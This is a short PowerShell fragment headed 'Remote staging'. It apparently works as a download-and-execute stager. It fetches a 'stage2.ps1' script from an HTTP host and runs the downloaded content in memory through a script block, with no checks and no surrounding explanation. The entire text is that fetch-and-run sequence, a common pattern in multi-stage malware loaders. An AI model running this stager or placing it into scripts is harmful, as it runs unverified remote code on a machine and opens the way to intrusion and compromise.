
# Remote staging
$Stage1Url = 'http://internal.corp:80/stage2.ps1'
$RemoteScript = (iwr $Stage1Url -UseBasicParsing).Content
[ScriptBlock]::Create($RemoteScript).Invoke()
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
